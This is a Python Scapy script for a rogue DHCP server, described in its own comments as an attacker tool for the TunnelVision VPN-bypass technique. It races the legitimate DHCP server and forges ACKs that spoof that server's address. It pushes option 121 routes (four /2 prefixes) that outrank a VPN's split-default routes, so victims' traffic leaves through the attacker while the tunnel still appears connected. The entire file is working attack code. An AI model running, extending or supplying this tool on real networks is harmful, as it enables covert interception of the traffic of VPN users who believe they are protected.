#!/usr/bin/env python3
# v1.4
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    sniff, sendp, get_if_hwaddr, conf
)
import ipaddress

SERVER_IP   = "192.168.88.3"   # our (attacker) DHCP service identity
REAL_SERVER = "192.168.88.1"   # the legitimate DHCP server we race / impersonate
SUBNET      = "192.168.88.0"
NETMASK     = "255.255.255.0"
GATEWAY     = "192.168.88.1"
DNS         = "8.8.8.8"
LEASE_TIME  = 3600
POOL_START  = 100
POOL_END    = 200
IFACE       = conf.iface   # override with e.g. "eth0" if needed

# When True, if a client REQUESTs its lease from REAL_SERVER (option 54),
# we forge an ACK that *impersonates* REAL_SERVER (src IP + option 54 spoofed)
# but carries OUR option 121, so the client installs our default route while
# believing the legitimate server granted the lease. Requires winning the race
# against the real ACK.
IMPERSONATE = True

leases    = {}   # mac -> ip
allocated = set()

pool = [
    str(ip)
    for ip in ipaddress.IPv4Network(f"{SUBNET}/24", strict=False).hosts()
    if POOL_START <= int(str(ip).split(".")[-1]) <= POOL_END
]


def build_opt121(routes):
    """Encode classless static routes per RFC 3442.

    Each entry: [prefix_len][significant_net_octets][4-byte_gateway]
    A prefix of 0 (default route) contributes 0 network octets.
    When option 121 is present, RFC 3442-compliant clients MUST ignore option 3.
    """
    data = b""
    for net_cidr, gw in routes:
        net    = ipaddress.IPv4Network(net_cidr, strict=False)
        prefix = net.prefixlen
        sig    = (prefix + 7) // 8          # significant octets for network
        data  += bytes([prefix]) + net.network_address.packed[:sig]
        data  += ipaddress.IPv4Address(gw).packed
    return data


# Beat the VPN's split-default routes (0.0.0.0/1 + 128.0.0.0/1) via longest-
# prefix-match: four /2 routes blanket the whole IPv4 space and are MORE
# specific than the VPN's /1, so the kernel prefers them and traffic exits
# through SERVER_IP instead of the tunnel. The VPN endpoint's own /32 host
# route stays most-specific, so the tunnel itself remains up (TunnelVision).
HIJACK_ROUTES = [
    ("0.0.0.0/2",   SERVER_IP),
    ("64.0.0.0/2",  SERVER_IP),
    ("128.0.0.0/2", SERVER_IP),
    ("192.0.0.0/2", SERVER_IP),
]
OPT121 = build_opt121(HIJACK_ROUTES)


pending = {}  # mac -> ip offered during DISCOVER but not yet ACKed


def next_free_ip(mac, hint=None):
    if mac in leases:
        return leases[mac]
    # honour the client's preferred IP if it falls inside our pool and is free
    if hint and hint in pool and hint not in allocated:
        return hint
    for ip in pool:
        if ip not in allocated:
            return ip
    return None


def handle_dhcp(pkt):
    if not (pkt.haslayer(DHCP) and pkt.haslayer(BOOTP)):
        return

    dhcp_opts = {opt[0]: opt[1] for opt in pkt[DHCP].options if isinstance(opt, tuple)}
    msg_type = dhcp_opts.get("message-type")
    client_mac = pkt[Ether].src

    if msg_type == 1:   # DISCOVER
        hint = str(dhcp_opts.get("requested_addr") or dhcp_opts.get("requested_IP_address") or "")
        offer_ip = next_free_ip(client_mac, hint or None)
        if not offer_ip:
            print("[!] Pool exhausted")
            return
        pending[client_mac] = offer_ip
        print(f"[DISCOVER] {client_mac} -> offering {offer_ip}")
        send_offer(pkt, client_mac, offer_ip)

    elif msg_type == 3:  # REQUEST
        req_server = str(dhcp_opts.get("server_id", ""))
        requested_ip = str(
            dhcp_opts.get("requested_addr")
            or dhcp_opts.get("requested_IP_address")
            or pkt[BOOTP].ciaddr
            or ""
        )

        # The client selected another (the real) server. Rather than stay
        # silent, forge an ACK that masquerades as that server so the client
        # accepts the lease it asked for + our option 121. We must echo the
        # exact IP it requested and spoof option 54 to the server it chose.
        if req_server and req_server != SERVER_IP:
            pending.pop(client_mac, None)
            if IMPERSONATE and requested_ip and requested_ip != "0.0.0.0":
                print(f"[REQUEST] {client_mac} -> SPOOFED ACK {requested_ip} (as {req_server})")
                send_ack(pkt, client_mac, requested_ip, server_ip=req_server)
            else:
                print(f"[REQUEST] {client_mac} -> ignored (client chose {req_server})")
            return

        # fall back to the IP we offered if the client echoes 0.0.0.0
        if not requested_ip or requested_ip == "0.0.0.0":
            requested_ip = pending.get(client_mac, "")
        if not requested_ip:
            return

        if requested_ip in pool and (requested_ip not in allocated or leases.get(client_mac) == requested_ip):
            leases[client_mac] = requested_ip
            allocated.add(requested_ip)
            pending.pop(client_mac, None)
            print(f"[REQUEST] {client_mac} -> ACK {requested_ip}")
            send_ack(pkt, client_mac, requested_ip)
        else:
            pending.pop(client_mac, None)
            print(f"[REQUEST] {client_mac} -> NAK (ip {requested_ip} unavailable)")
            send_nak(pkt, client_mac)

    elif msg_type == 7:  # RELEASE
        ip = leases.pop(client_mac, None)
        pending.pop(client_mac, None)
        if ip:
            allocated.discard(ip)
            print(f"[RELEASE] {client_mac} released {ip}")


def build_base(pkt, client_mac, your_ip, src_ip=SERVER_IP):
    server_mac = get_if_hwaddr(IFACE)
    return (
        Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=src_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(
            op=2,
            yiaddr=your_ip,
            siaddr=src_ip,
            chaddr=bytes.fromhex(client_mac.replace(":", "")),
            xid=pkt[BOOTP].xid,
            flags=pkt[BOOTP].flags,
        )
    )


def send_offer(pkt, client_mac, offer_ip):
    reply = build_base(pkt, client_mac, offer_ip) / DHCP(options=[
        ("message-type", "offer"),
        ("server_id", SERVER_IP),
        ("lease_time", LEASE_TIME),
        ("subnet_mask", NETMASK),
        ("name_server", DNS),
        (121, OPT121),
        "end",
    ])
    sendp(reply, iface=IFACE, verbose=False)


def send_ack(pkt, client_mac, ack_ip, server_ip=SERVER_IP):
    # server_ip defaults to us; when impersonating the real server we spoof
    # both the source IP (build_base) and option 54 to that server's address.
    reply = build_base(pkt, client_mac, ack_ip, src_ip=server_ip) / DHCP(options=[
        ("message-type", "ack"),
        ("server_id", server_ip),
        ("lease_time", LEASE_TIME),
        ("subnet_mask", NETMASK),
        ("name_server", DNS),
        (121, OPT121),
        "end",
    ])
    sendp(reply, iface=IFACE, verbose=False)


def send_nak(pkt, _):
    server_mac = get_if_hwaddr(IFACE)
    reply = (
        Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src=SERVER_IP, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(op=2, xid=pkt[BOOTP].xid) /
        DHCP(options=[
            ("message-type", "nak"),
            ("server_id", SERVER_IP),
            "end",
        ])
    )
    sendp(reply, iface=IFACE, verbose=False)


if __name__ == "__main__":
    print(f"[*] DHCP server v1.4 on {IFACE}")
    print(f"[*] Pool: {SUBNET} [{POOL_START}-{POOL_END}], GW: {GATEWAY}")
    print(f"[*] Impersonation: {'ON (spoofing ' + REAL_SERVER + ')' if IMPERSONATE else 'OFF'}")
    sniff(
        iface=IFACE,
        filter="udp and (port 67 or port 68)",
        prn=handle_dhcp,
        store=False,
    )
